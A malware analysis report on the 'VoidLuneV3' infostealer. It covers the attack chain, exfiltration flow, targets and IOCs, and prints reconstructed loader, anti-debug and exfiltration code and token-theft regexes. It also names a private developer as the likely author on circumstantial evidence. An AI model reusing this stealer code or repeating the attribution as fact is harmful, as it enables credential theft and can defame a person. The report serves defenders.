# VoidLuneV3 — Electron/Java Infostealer — Full Malware Analysis

> **TLP: WHITE** — Suitable for public distribution
> **Date:** 2026-06-22
> **Severity:** CRITICAL
> **Malware Family:** VoidLuneV3
> **Type:** Multi-stage Infostealer (Electron loader + Java payload)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Sample Information](#sample-information)
3. [Attack Chain](#attack-chain)
4. [Stage 1 — Electron JS Loader](#stage-1--electron-js-loader)
5. [Stage 2 — Java Payload](#stage-2--java-payload-salamsjar)
6. [Capability Map](#capability-map)
7. [C2 Infrastructure](#c2-infrastructure)
8. [Browser Credential Theft](#browser-credential-theft)
9. [Discord Token Stealer](#discord-token-stealer)
10. [Cryptocurrency Wallet Theft](#cryptocurrency-wallet-theft)
11. [Anti-Analysis Techniques](#anti-analysis-techniques)
12. [IOCs](#iocs)
13. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
14. [C2 Infrastructure — Deep Dive](#c2-infrastructure--deep-dive)
15. [Developer Attribution](#developer-attribution)
16. [Source Files](#source-files)

---

## Executive Summary

**VoidLuneV3** is a heavily obfuscated, multi-stage information stealer distributed as a fake Electron desktop application (`.exe` with bundled Chromium). Upon execution it silently drops a Java payload (`salams.jar`) and a bundled JVM (`javam.exe`) into `%LOCALAPPDATA%`, runs it fully detached from any visible window, then self-destructs all source files.

The Java payload (obfuscated with **Zelix KlassMaster v26.0.2**) spawns 18+ parallel threads to simultaneously steal:
- Credentials, cookies, and session tokens from **23 browsers**
- **Discord tokens** with account badge/tier profiling for valuation
- **Azure/Microsoft OAuth tokens**
- **44+ cryptocurrency wallet browser extensions** and 10 desktop wallets
- Full **desktop screenshots**
- **Text files** from the victim's Desktop

All stolen data is packed into a ZIP archive, uploaded to **GoFile** (a legitimate file hosting service abused as a dead-drop), and the resulting download link is then POSTed to the attacker's C2 at `swordfull.com`. A **UAC elevation helper** (`elevate.exe`) is bundled to attempt privilege escalation before payload execution.

---

## Sample Information

| Field | Value |
|-------|-------|
| File Type | PE32+ Electron application |
| Author Tag | `VoidLuneV3` (package.json description + author) |
| Stage 1 Entry | `app.asar` via `75x5mr.js` shim -> `dnufit5.js` |
| Stage 1 Obfuscation | LZString UTF-16 compression + control-flow flattening |
| Stage 2 Payload | `salams.jar` (Java 11+) |
| Stage 2 Obfuscation | Zelix KlassMaster v26.0.2 |
| Bundled JVM | `javam.exe` (stripped JRE, `resources/jvm/`) |
| Elevation Helper | `elevate.exe` (ShellExecuteExW runas, x86 PE32) |
| Elevation Helper PDB | `C:\Dev\elevate\bin\x86\Release\Elevate.pdb` |
| Platform | Windows x64 (x86 elevation helper) |

---

## Attack Chain

```
[Victim runs fake .exe]
        |
        v
[NSIS installer extracts Electron app]
        |
        v
[Electron loads app.asar]
        |
        v
[75x5mr.js shim -> require('./dnufit5.js')]
        |
        v
[dnufit5.js: LZString UTF-16 decompress -> eval(payload)]
        |
        v
[JS resolves %LOCALAPPDATA%\[random]\{bin,lib}]
        |
        +---> Copies javam.exe  -> %LOCALAPPDATA%\[rand]\bin\javam.exe
        +---> Copies salams.jar -> %LOCALAPPDATA%\[rand]\lib\salams.jar
        |
        v
[Attempts UAC elevation via elevate.exe (ShellExecuteExW runas)]
        |
        v
[spawn('javam.exe', ['-jar','salams.jar'], {detached:true, stdio:'ignore'})]
[child.unref() -> Java process survives Electron exit]
        |
        v
[app.quit() + rmSync(resources, recursive:true) -> self-destruct]
        |
        v
[salams.jar: a.Main -> anti-debug JVM arg check -> mutex check -> a.b.D.r1n()]
        |
        v
[ExecutorService: 18+ parallel threads spawned]
    |         |         |         |         |
    v         v         v         v         v
[Browser  [Discord  [Crypto   [Screen-  [SysInfo +
 Stealer]  Tokens]   Wallets]  shot]     Proc List]
    |         |         |         |         |
    +----+----+---------+---------+---------+
         |
         v
   [Pack all data into ZIP (ZipOutputStream)]
         |
         v
   [POST ZIP -> https://upload.gofile.io/uploadfile]
         |
         v
   [GoFile returns download URL]
         |
         v
   [POST {url + victim metadata} -> https://swordfull.com/m/]
```

---

## Stage 1 — Electron JS Loader

**File:** `app.asar/dnufit5.js` (entry shim: `75x5mr.js` -> `require('./dnufit5.js')`)
**Compressed size:** ~63 KB
**Obfuscation:** LZString UTF-16 compression + control-flow flattening

### Key Behaviors (reconstructed from deobfuscation)

```javascript
// Resolves drop directory under %LOCALAPPDATA%
const localAppData = process.env.LOCALAPPDATA ||
                     path.join(process.env.USERPROFILE, 'AppData', 'Local');
const dropDir = path.join(localAppData, randomDirName);

// Drops payload files from bundled resources
fs.mkdirSync(path.join(dropDir, 'bin'), { recursive: true });
fs.mkdirSync(path.join(dropDir, 'lib'), { recursive: true });
fs.copyFileSync(jvmSrc,  path.join(dropDir, 'bin', 'javam.exe'));
fs.copyFileSync(jarSrc,  path.join(dropDir, 'lib', 'salams.jar'));

// Attempt UAC elevation (silently fails if user denies)
spawn('elevate.exe', ['javam.exe', '-jar', 'salams.jar'], { ... });

// Detached execution — Java process survives Electron exit
const child = spawn(javamPath, ['-jar', jarPath], {
    detached: true,
    stdio:    'ignore'
});
child.unref();

// Self-destruct — removes all evidence from resources dir
app.quit();
fs.rmSync(resourcesPath, { recursive: true, force: true });
```

**Deobfuscated source:** `source/Stage1_Electron_Loader_Deobfuscated.js`

---

## Stage 2 — Java Payload (salams.jar)

**Obfuscator:** Zelix KlassMaster v26.0.2
**Entry point:** `a.Main` -> `a.b.D.r1n()`
**Architecture:** `ExecutorService` with 18+ parallel worker threads

### Class Map (Obfuscated Name -> Purpose)

| Obfuscated Class | Purpose |
|-----------------|---------|
| `a.Main` | Entry point: anti-debug check, mutex, launch orchestrator |
| `a.b.D` | Thread orchestrator — spawns all stealer modules |
| `a.b.d.dec` | Chromium DPAPI decryptor + Firefox NSS/PK11SDR decryptor |
| `a.b.d.dec$NssLib` | JNA interface to `nss3.dll` for Firefox decryption |
| `a.b.d.dec$NssSec` | Firefox NSS SECITEM struct (JNA) |
| `a.b.d.a` | Browser stealer — Opera Air |
| `a.b.d.b` | Browser stealer — Brave |
| `a.b.d.c` | Browser stealer — Chrome |
| `a.b.d.e` | Browser stealer — Edge |
| `a.b.d.f` | Browser stealer — Firefox |
| `a.b.d.g` | Browser stealer — Opera GX |
| `a.b.d.j` | Mutex handler (Win32 CreateMutex via JNA) |
| `a.b.d.o` | Browser stealer — Opera |
| `a.b.d.t` | Browser stealer — Tor Browser |
| `a.b.d.v` | Browser stealer — Vivaldi |
| `a.b.d.wf` | Browser stealer — Waterfox |
| `a.b.d.y` | Browser stealer — Yandex |
| `a.b.d.ze` | Browser stealer — Zen Browser |
| `a.b.c.i` | Discord token stealer + account profiler |
| `a.b.c.k` | Cryptographic key utility |
| `a.b.c.p` | Discord badge enumerator + C2 exfiltration sender |
| `a.b.c.u` | Anti-VM: hostname/username/GPU blocklist (400+ entries) |
| `a.b.c.x` | HTTP client for C2 communication (`swordfull.com`) |
| `a.b.c.z` | ZIP packer for exfiltration bundle |
| `a.b.e.gf` | GoFile multipart uploader |
| `a.b.e.m` | `Runtime.exec()` command executor |
| `a.b.e.q` | File enumerator (.txt harvester) |
| `a.b.e.r` | Crypto wallet extension stealer |
| `a.b.e.s` | Screenshot capture (`java.awt.Robot`) |
| `a.b.e.u` | Process enumerator + `lsass.exe` hunter + VM process check |
| `a.b.e.w` | Desktop crypto wallet + browser extension wallet stealer |

---

## Capability Map

```
VoidLuneV3 Capabilities
|
+-- INITIAL ACCESS
|   +-- Fake Electron desktop application (.exe)
|
+-- EXECUTION
|   +-- Electron JS eval() of LZString-compressed payload
|   +-- Java process spawned detached via javam.exe -jar salams.jar
|
+-- PRIVILEGE ESCALATION
|   +-- elevate.exe (ShellExecuteExW + runas verb, UAC prompt)
|       PDB: C:\Dev\elevate\bin\x86\Release\Elevate.pdb
|
+-- DEFENSE EVASION
|   +-- Two-stage obfuscation (LZString + Zelix KlassMaster v26)
|   +-- Process runs with no window (stdio:ignore, detached)
|   +-- Self-deletes all source files after drop (rmSync recursive)
|   +-- Fake Chrome User-Agent on all HTTP requests
|   +-- JVM debugger argument detection -> System.exit(0)
|   +-- Mutex enforcement (single instance)
|   +-- 400+ sandbox hostname/username blocklist
|   +-- VM process detection (vmtoolsd, vboxtray, qemu-ga, etc.)
|   +-- VM GPU string detection (VMware SVGA, VirtualBox, Hyper-V)
|
+-- CREDENTIAL ACCESS
|   +-- Chromium browsers (19 targets)
|   |   +-- CryptUnprotectData (DPAPI) -> AES-256-GCM master key
|   |   +-- Decrypts Login Data (passwords) + Cookies
|   +-- Gecko browsers (4 targets)
|   |   +-- JNA load nss3.dll -> NSS_Init -> PK11SDR_Decrypt
|   |   +-- Decrypts key4.db / logins.json
|   +-- Discord tokens (regex match on leveldb/localStorage)
|   +-- Azure/Microsoft OAuth tokens
|
+-- COLLECTION
|   +-- Full desktop screenshot (java.awt.Robot)
|   +-- Desktop .txt file harvest
|   +-- Running process list (CreateToolhelp32Snapshot)
|   +-- lsass.exe targeting (DPAPI master key / credential dump)
|   +-- 10 desktop crypto wallets
|   +-- 44+ browser extension crypto wallets
|   +-- Discord account badge profiling (account valuation)
|
+-- EXFILTRATION
    +-- ZIP all stolen data (ZipOutputStream -> ByteArrayOutputStream)
    +-- POST ZIP to GoFile (https://upload.gofile.io/uploadfile)
    +-- POST {GoFile URL + victim info} to C2 (https://swordfull.com/m/)
```

---

## C2 Infrastructure

| Role | Endpoint | Protocol |
|------|----------|----------|
| **Primary C2** | `https://swordfull.com/m/` | HTTPS/2 POST (Java 17 HttpClient) |
| **Exfil staging** | `https://upload.gofile.io/uploadfile` | HTTPS multipart POST |

**User-Agent (spoofed):**
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```

### Exfiltration Flow Detail

The pipeline uses **dual-endpoint parallel dispatch** — every send fires two concurrent `CompletableFuture.runAsync()` tasks simultaneously. If either endpoint is unavailable, the other still receives the stolen data:

```
Step 1: Stolen data cached to local SQLite database (sqlite-jdbc 3.45.3.0)
        Allows retry on network failure without re-stealing data

Step 2: Pack all stolen data into in-memory ZIP
        a.b.c.z: ZipOutputStream -> ByteArrayOutputStream

Step 3a [Thread 1]: Multipart POST to GoFile
         POST https://upload.gofile.io/uploadfile
         Content-Type: multipart/form-data; boundary=<random UUID>
         Body: [ZIP file bytes]
         Response: {"status":"ok","data":{"downloadPage":"https://gofile.io/d/XXXX",...}}

Step 3b [Thread 2]: POST metadata + GoFile link to C2 (runs concurrently)
         POST https://swordfull.com/m/
         Content-Type: multipart/form-data; boundary=<random UUID>
         User-Agent: <Chrome 121 UA>
         Body: license token + victim data fields (Gson-serialized JSON)

Step 4: CompletableFuture.allOf() waits for both threads with timeout
        Retry: 3 attempts with exponential backoff (Thread.sleep)
        Rate-limit: HTTP 429 triggers additional sleep
```

> **Resilience design:** The dual-endpoint model means takedown of `swordfull.com` does NOT stop exfiltration — stolen ZIPs continue reaching the attacker via GoFile. Only a small metadata beacon goes to the C2 domain; actual credential data travels via GoFile's trusted CDN, making network-layer detection significantly harder.

**Source class:** `a.b.c.x` (field `U` — C2 URL loaded from JAR resource `a/b/c/license.txt`)
**Exfil class:** `a.b.e.gf` (GoFile upload handler)

### Per-Build Authentication Token

Each compiled build embeds a unique token in the JAR at `a/b/c/license.txt`, read at runtime via `Class.getResourceAsStream()`:

```
Observed token: license-20260326220248-ce21
Format:         license-<YYYYMMDDHHMMSS>-<4hex>
Decoded date:   2026-03-26 22:02:48 UTC
                (24 days after domain registration 2026-03-02)
```

The token serves as a per-campaign identifier — different victim builds likely carry different tokens, allowing the operator to attribute each submission to a specific distribution channel.

### C2 API Methods (Reconstructed from Bytecode)

Four distinct API operations were identified from full disassembly of `a.b.c.x`:

| Method | Purpose | Key Payload Fields |
|--------|---------|-------------------|
| `a1b()` | Discord profile + token dump | license, os.name, USERNAME env, hostname, Discord token (k1y), username (u2n), discriminator (d3s), user ID (i4d), badge string, Nitro type (c9t), email (e6m), phone (p7h), booster status (o0b), stolen tokens list (s1v), gift data (g1t), avatar URL, friend list batched ~285/request, totalFriends |
| `c2d(String)` | Crypto wallet data exfil | license, system ID, wallet extension data via `a.b.e.r.s5m()`, encryption key via `a.b.c.k.f1n()` |
| `e3f(byte[], String)` | Binary ZIP upload | Raw byte array as multipart attachment, filename, system ID, encryption key |
| `g4h(...)` | General structured report | 3 string fields, integer counter, boolean isLast flag; increments `a.b.d.dec.V` success counter |

All methods serialize with **Gson 2.10.1** then route through the dual-endpoint `k()` dispatcher.

---

## C2 Infrastructure — Deep Dive

This section documents live infrastructure reconnaissance conducted as part of this analysis.

### Domain Registration

| Field | Value |
|-------|-------|
| Registered | 2026-03-02T22:18:26Z |
| Expires | 2027-03-02T22:18:26Z |
| Registrar | Turkticaret.net Yazilim Hizmetleri (IANA ID: 819) |
| Registrant Country | **TR (Turkey)** — leaked despite GDPR masking |
| Name Servers | `peaches.ns.cloudflare.com` / `stan.ns.cloudflare.com` |
| Domain Status | `clientTransferProhibited` |
| DNSSEC | Unsigned |

Domain was registered **24 days before the JAR build date** — consistent with deliberate campaign infrastructure preparation.

### DNS Records

| Record | Name | Value | Notes |
|--------|------|-------|-------|
| A | root | NONE | Cloudflare orange-cloud; origin IP hidden |
| A | www | 104.21.21.143, 172.67.199.30 | Cloudflare edge, Dallas (DFW) PoP |
| A | m. | NXDOMAIN | C2 path is on root domain, not a subdomain |
| A | api. | NXDOMAIN | No API subdomain exists |
| NS | @ | peaches.ns.cloudflare.com, stan.ns.cloudflare.com | |
| SOA serial | @ | 2406953209 | |

### TLS Certificate

```
Issuer:     Let's Encrypt E8
Not Before: 2026-04-30 22:14:57 UTC  (58 days post-registration)
Not After:  2026-07-29 22:14:56 UTC
Subject:    CN=swordfull.com
SANs:       swordfull.com, *.swordfull.com
Key type:   EC/prime256v1 (256-bit)
```

Certificate was issued 58 days after registration — consistent with staged infrastructure build-out.

### Live HTTP Response Map

| Path | Method | HTTP Response | Interpretation |
|------|--------|---------------|----------------|
| `/` | GET | **530** error 1016 | Origin server unreachable |
| `/m/` | GET | **403** "Suspected Malware" | Cloudflare WAF active block |
| `/m/` | POST | **403** "Suspected Malware" | WAF block applies to all methods |
| `/m/<license>` | GET | **530** error 1016 | Origin DNS fails on subpaths |
| `/m/api/` | GET | **530** error 1016 | Origin DNS fails on subpaths |
| `www/` | GET | **403** error 1016 | www backend currently dead |

**Critical distinction:** `/m/` returns 403 (WAF block) while all other paths return 530 (origin unreachable). Cloudflare IS proxying `/m/` to a live origin — it is blocked at the WAF layer only. Victims connecting from unblocked residential IP ranges may still be reaching the origin server.

### Cloudflare Threat Intelligence Status

`swordfull.com` has been **independently flagged by Cloudflare** as "Suspected Malware" as of 2026-06-22:

- **Block reason:** "This website has been reported for potentially distributing malware"
- **Challenge:** Cloudflare Turnstile CAPTCHA (sitekey `0x4AAAAAABDaGKKSGLylJZFA`)
- **Bypass path:** `/cdn-cgi/phish-bypass?atok=<token>&original_path=/m/`
- **NEL telemetry:** All access attempts reported to `a.nel.cloudflare.com/report/v4`

The Network Error Logging endpoint means Cloudflare is collecting metadata on every connection attempt to this domain, which may be available to law enforcement via legal process.

---

## Browser Credential Theft

### Chromium-based Browsers (19 targets)

Decryption method: reads `Local State` JSON -> base64-decodes `encrypted_key` -> calls `CryptUnprotectData` (DPAPI) -> uses resulting key to AES-256-GCM decrypt all stored passwords and cookies.

| Browser | Path |
|---------|------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data` |
| Microsoft Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data` |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data` |
| Opera | `%APPDATA%\Opera Software\Opera Stable` |
| Opera GX | `%APPDATA%\Opera Software\Opera GX Stable` |
| Opera Air | `Browsers/Opera Air/` |
| Vivaldi | `%LOCALAPPDATA%\Vivaldi\User Data` |
| Yandex | `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data` |
| CentBrowser | `%LOCALAPPDATA%\CentBrowser\User Data` |
| Chrome SxS (Canary) | `%LOCALAPPDATA%\Google\Chrome SxS\User Data` |
| Kometa | `%LOCALAPPDATA%\Kometa\User Data` |
| Epic Privacy Browser | `%LOCALAPPDATA%\Epic Privacy Browser\User Data` |
| Iridium | `%LOCALAPPDATA%\Iridium\User Data` |
| Torch | `%LOCALAPPDATA%\Torch\User Data` |
| Orbitum | `%LOCALAPPDATA%\Orbitum\User Data` |
| Sputnik | `%LOCALAPPDATA%\Sputnik\Sputnik\User Data` |
| 7Star | `%LOCALAPPDATA%\7Star\7Star\User Data` |
| Uran | `%LOCALAPPDATA%\uCozMedia\Uran\User Data` |
| Amigo | `%LOCALAPPDATA%\Amigo\User Data` |

**JNA APIs used:** `Crypt32Util.cryptUnprotectData`, `NCryptDecrypt`, `NCryptOpenStorageProvider`

### Gecko/Firefox-based Browsers (4 targets)

Decryption method: dynamically loads `nss3.dll` via JNA, calls `NSS_Init(profilePath)` then `PK11SDR_Decrypt` to decrypt the Firefox key database and credential store.

| Browser | Path |
|---------|------|
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles` |
| Waterfox | `%APPDATA%\Waterfox\Profiles` |
| Zen Browser | `%APPDATA%\zen\Profiles` |
| Tor Browser | `Browsers/TorBrowser/` |

**JNA interfaces:** `dec$NssLib.NSS_Init`, `dec$NssLib.PK11SDR_Decrypt`, `SECITEM_FreeItem`

---

## Discord Token Stealer

### Token Extraction Patterns

```
Standard token:  ([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110})
MFA token:       (mfa\.[\w-]{84})
Azure OAuth:     ([\w-]{10,}\.login\.windows\.net-[\w-]+)
YouTube-DL:      dQw4w9WgXcQ:([^"\s]*)
```

### Discord Paths Targeted

```
%APPDATA%\discord
%APPDATA%\discordptb
%APPDATA%\discordcanary
%APPDATA%\Lightcord
```

### Account Badge Profiling

The malware enumerates Discord account badges to assign monetary value before exfiltration. Higher-tier accounts are likely prioritized or sold at premium:

`staff` | `partner` | `hypesquad` | `bug_hunter_level_1` | `bug_hunter_level_2`
`early_supporter` | `verified_developer` | `active_developer` | `certified_moderator`
`guild_booster_lvl1` through `guild_booster_lvl9`
`nitro` | `nitro_gold` | `nitro_silver` | `nitro_bronze` | `nitro_ruby`
`nitro_emerald` | `nitro_opal` | `nitro_diamond` | `nitro_platinum`
`quest_completed` | `orb_profile_badge`

---

## Cryptocurrency Wallet Theft

### Desktop Wallets (10)

| Wallet | Stolen Path |
|--------|------------|
| Exodus | `Exodus\exodus.wallet` |
| Electrum | `Electrum\wallets` |
| Atomic Wallet | `atomic\Local Storage\leveldb` |
| Guarda | `Guarda\Local Storage\leveldb` |
| Coinomi | `Coinomi\Coinomi\wallets` |
| Jaxx Liberty | `com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb` |
| Ethereum Keystore | `Ethereum\keystore` |
| Bytecoin | `bytecoin` |
| Zcash | `Zcash` |
| Armory | `Armory` |

### Browser Extension Wallets (44+ targets)

| Wallet | Extension ID |
|--------|-------------|
| MetaMask | `nkbihfbeogaeaoehlefnkodbefgpgknn` |
| MetaMask (alt) | `aodkkagnadcbobfpggfnjeongemjbjca` |
| Phantom | `bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| Coinbase Wallet | `hnfanknocfeofbddgcijnmhnfnkdnaad` |
| Trust Wallet | `egjidjbpglichdcondbcbdnbeeppgdph` |
| Keplr | `dmkamcknogkgcdfhhbddcghachkejeap` |
| Ronin | `eigblbgjknlfbajkfhopmcojidlgcehm` |
| Yoroi | `ffnbelfdoeiohenkjibnmadjiehjhajb` |
| Nami | `lpfcbjknijpeeillifnkikgncikgfhdo` |
| Petra (Aptos) | `ejjladinnckdgjemekebdpeokbikhfci` |
| Martian | `blnieiiffboillknjnepogjhkgnoapac` |
| Math Wallet | `afbcbjpbpfadlkmhmclhkeeodmamcflc` |
| Binance Chain | `fhbohimaelbohpjbbldcngcnapndodjp` |
| XDEFI | `hmeobnfnfcmdkdcmlblgagmfpfboieaf` |
| Liquality | `kpfopkelmapcoipemfendmdcghnegimn` |
| Slope | `pocmplpaccanhmnllbbkpgfliimjljgo` |
| Safepal | `lgmpcpglpngdoalbgeoldeajfclnhafa` |
| Tokenpocket | `nphplpgoakhhjchkkhmiggakijnkhfnd` |
| Kaikas | `jblndlipeogpafnldhgmapagcccfchpi` |
| TerraStation | `aiifbnbfobpmeekipheeijimdpnlpgpp` |
| Coin98 | `aeachknmefphepccionboohckonoeemg` |
| Nifty | `jbdaocneiiinmjbjlgalhcelgbejmnid` |
| PaliWallet | `efbglgofoippbgcjepnhiblaibcnclgk` |
| BoltX | `aodkkagnadcbobfpggfnjeongemjbjca` |
| Fewcha | `fhilaheimglignddkjgofkcbgekhenbh` |
| Starcoin | `mfhbebgoclkghebffdldpobeajmbecfk` |
| Swash | `cmndjbecilbocjfkibfbifhngkdmjgog` |
| Finnie | `cjelfplplebdjjenllpjcblmjkfcffne` |
| Guild | `fnnegphlobjdpkhecapkijjdkgcjhkib` |
| KardiaChain | `abnegfkaffbgelpmjddhflpocdjfbkna` |
| + 14 more | See `source/CryptoWallet_DesktopAndExtension_Stealer.javap` |

---

## Anti-Analysis Techniques

### 1. Two-Stage Obfuscation

- **Stage 1 (JS):** LZString UTF-16 compression + control-flow flattening. The entire payload is a single compressed string that is decompressed and `eval()`'d at runtime.
- **Stage 2 (Java):** Zelix KlassMaster v26.0.2. All string constants are encrypted with XOR + rotating key and a 256-entry S-box decoder. All class and method names are renamed to single letters.

### 2. Anti-Debug — JVM Argument Inspection

```java
List<String> args = ManagementFactory.getRuntimeMXBean().getInputArguments();
for (String arg : args) {
    if (arg.contains("-agentlib:jdwp") ||
        arg.contains("-Xdebug")        ||
        arg.contains("-javaagent")     ||
        arg.contains("-Xrunjdwp")) {
        System.exit(0);  // Silent exit if debugger detected
    }
}
```

### 3. Mutex / Single Instance

Uses Win32 `CreateMutex` via JNA (`a.b.d.j` — two `WinNT$HANDLE` fields) to prevent multiple instances running simultaneously.

### 4. Anti-VM — Hostname/Username Blocklist (400+ entries)

Checks `System.getProperty("user.name")` and machine hostname against a hardcoded list. If matched, execution aborts. Sample entries:

`WDAGUtilityAccount` `azure` `test` `sandbox` `floppy` `DefaultAccount` `Guest`
`COMPNAME_4803` `COMPNAME_4416` `COMPNAME_3485` `DESKTOP-0000000` `vmwaretray`
`prl_tools` `vboxtray` `qemu-ga` `xenservice` + 390 more

### 5. Anti-VM — Process Detection

Checks running process list for virtualization-related processes:

| Process | Platform |
|---------|---------|
| `vmwaretray`, `vmwareuser`, `vmusrvc`, `vmtoolsd`, `vgauthservice`, `vmacthlp` | VMware |
| `prl_cc`, `prl_tools` | Parallels |
| `vboxtray`, `vboxservice` | VirtualBox |
| `xenservice` | Xen |
| `qemu-ga` | QEMU |

### 6. Anti-VM — GPU String Detection

Checks display adapter device name:

- `VMware SVGA 3D`
- `VirtualBox Graphics Adapter`
- `VirtualBox Graphics Adapter (WDDM)`
- `Microsoft Hyper-V Video`
- `Virtual Desktop Monitor`
- `ASPEED Graphics Family(WDDM)`
- `Standard VGA Graphics Adapter`
- `Microsoft Basic Display Adapter`
- `Microsoft Remote Display Adapter`

---

## IOCs

### Network

```
# Domains — BLOCK/MONITOR
swordfull.com                              [Primary C2 — BLOCK]
upload.gofile.io                           [Exfil staging — monitor (legitimate service abused)]
gofile.io                                  [Attacker retrieves stolen ZIPs via this domain]

# C2 Request URLs
POST https://swordfull.com/m/              [Victim metadata beacon]
POST https://upload.gofile.io/uploadfile   [Credential ZIP upload]

# HTTP Indicators
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: multipart/form-data          [boundary = random UUID per request]
HTTP version: HTTP/2

# DNS
swordfull.com NS: peaches.ns.cloudflare.com, stan.ns.cloudflare.com
swordfull.com www A: 104.21.21.143         [Cloudflare edge, Dallas PoP]
swordfull.com www A: 172.67.199.30         [Cloudflare edge, Dallas PoP]

# Domain Registration
Registrar: Turkticaret.net Yazilim Hizmetleri (IANA ID: 819)
Registrant country: TR (Turkey)
Registered: 2026-03-02

# Per-build auth token (embedded in JAR at a/b/c/license.txt)
license-20260326220248-ce21                [Build 2026-03-26; format: license-<YYYYMMDDHHMMSS>-<4hex>]
```

### File System

```
%LOCALAPPDATA%\[random]\bin\javam.exe   [dropped JVM]
%LOCALAPPDATA%\[random]\lib\salams.jar  [dropped Java payload]
```

### Process

```
javam.exe spawned from %LOCALAPPDATA%\*\bin\ with -jar flag
javam.exe has no visible window (stdio:ignore, detached from parent)
Parent Electron process exits immediately after spawn
```

### Strings (plaintext — survives obfuscation removal)

```
# Malware identity
VoidLuneV3
salams.jar
javam.exe
ZKM26.0.2

# C2 infrastructure
swordfull.com
https://swordfull.com/m/
https://upload.gofile.io/uploadfile

# Maven build metadata (NOT obfuscated — developer identifier)
com.mirac
private-project
1.0-SNAPSHOT

# Per-build auth token (JAR path: a/b/c/license.txt)
license-20260326220248-ce21

# Encoding
ISO-8859-1
```

### Token Regex Signatures

```
([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84})
[\w-]{10,}\.login\.windows\.net-[\w-]+
dQw4w9WgXcQ:([^"\s]*)
```

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Implementation |
|-------------|------|----------------|
| T1059.007 | JavaScript Execution | Electron JS loader (dnufit5.js) |
| T1027 | Obfuscated Files | LZString UTF-16 + ZKM26 two-stage obfuscation |
| T1027.002 | Software Packing | Zelix KlassMaster v26.0.2 |
| T1548.002 | Bypass UAC | elevate.exe via ShellExecuteExW runas verb |
| T1555.003 | Credentials from Web Browsers | 23 browsers — DPAPI + NSS decryption |
| T1539 | Steal Web Session Cookie | All targeted browsers |
| T1528 | Steal Application Access Token | Discord tokens, Azure OAuth tokens |
| T1005 | Data from Local System | Crypto wallets, .txt files |
| T1113 | Screen Capture | java.awt.Robot.createScreenCapture() |
| T1041 | Exfiltration Over C2 Channel | HTTPS POST to swordfull.com |
| T1567.002 | Exfiltration to Cloud Storage | GoFile dead-drop (upload.gofile.io) |
| T1622 | Debugger Evasion | JVM input argument inspection |
| T1497.001 | Virtualization/Sandbox Evasion | 400+ hostname blocklist + GPU + process checks |
| T1057 | Process Discovery | CreateToolhelp32Snapshot + lsass.exe targeting |
| T1083 | File and Directory Discovery | Wallet paths + Desktop .txt enumeration |
| T1480 | Execution Guardrails | Mutex + single-instance enforcement |

---

## Developer Attribution

> **Disclaimer:** The following attribution is based on circumstantial technical evidence and does not constitute a confirmed legal identification. Definitive attribution requires corroboration from GitHub, registrar, or Cloudflare records obtained via appropriate legal process.

### Maven Build Metadata (Extracted from salams.jar)

The JAR contains Maven POM metadata that was **not obfuscated** by Zelix KlassMaster:

```xml
<!-- META-INF/maven/com.mirac/private-project/pom.xml -->
<groupId>com.mirac</groupId>
<artifactId>private-project</artifactId>
<version>1.0-SNAPSHOT</version>
<maven.compiler.source>17</maven.compiler.source>
<maven.compiler.target>17</maven.compiler.target>
```

Build configuration:
- Tool: `maven-assembly-plugin 3.7.1` (jar-with-dependencies)
- Compiler: `maven-compiler-plugin 3.13.0`
- Target: Java 17
- Entry point: `a.Main`

In Maven convention, `groupId` typically reflects the developer's domain or username. `com.mirac` directly mirrors the GitHub username `mirac`.

### Bundled Dependencies (pom.xml)

| Library | Version | Role in Malware |
|---------|---------|-----------------|
| `org.xerial:sqlite-jdbc` | 3.45.3.0 | Local credential database before exfil |
| `com.google.code.gson:gson` | 2.10.1 | JSON serialization for C2 protocol |
| `net.java.dev.jna:jna` | 5.14.0 | Native Win32 API (DPAPI, NCrypt, TlHelp32) |
| `net.java.dev.jna:jna-platform` | 5.14.0 | Crypt32Util, WinNT, WinDef wrappers |

### GitHub Attribution Lead

A GitHub account matching the Maven groupId was identified with corroborating indicators:

| Field | Value |
|-------|-------|
| Handle | `mirac` |
| Full name | Miraç Satıç |
| Location | **Ankara, Turkey** |
| Company | Connect ION Tech. Co. |
| Personal site | mirac.me |
| Bio | *"Software Developer — Areas: Java/Spring, Go, NodeJS, GIT, TFS, Maven, GNU/Linux"* |
| Account created | 2011-01-22 (15-year established account) |
| Public repos | 32 |
| Last repo activity | **2026-03-16** |

### Correlation Matrix

| Indicator | Evidence | Confidence |
|-----------|----------|------------|
| Maven groupId `com.mirac` matches GitHub handle `mirac` | Exact string match | HIGH |
| Bio lists Java + Maven as primary stack | Exact technology stack match | HIGH |
| Location: Ankara, Turkey | Matches leaked WHOIS registrant country TR | MEDIUM |
| GitHub last active 2026-03-16 | 10 days before JAR build date 2026-03-26 | MEDIUM |
| Domain registered 2026-03-02 | 14 days before last GitHub activity | MEDIUM |
| Account age 15 years | Established developer identity, not a throwaway | LOW |

**Overall attribution confidence: MEDIUM**

A second Turkish developer (`mrKodat` / Miraç Kodat, Istanbul, IWWOMI) shares the given name but works in an incompatible stack (Vue/Dart/Flutter). Assessed **LOW confidence**.

### Recommended Reporting Contacts

| Organisation | Purpose | Contact |
|---|---|---|
| Cloudflare | Hosting/WAF provider; holds NEL telemetry logs | abuse@cloudflare.com |
| Turkticaret.net | Domain registrar; holds registrant identity | abuse@turkticaret.net / +90.2242248640 |
| GoFile | Secondary exfil service; holds stolen victim ZIPs | abuse@gofile.io |
| GitHub | Developer account host | github.com/contact/abuse |

---

## Source Files

All disassembled `.javap` files and deobfuscated source are in `source/`:

| File | Description |
|------|-------------|
| `Stage1_Electron_Loader_Deobfuscated.js` | Stage 1 JS loader, fully deobfuscated |
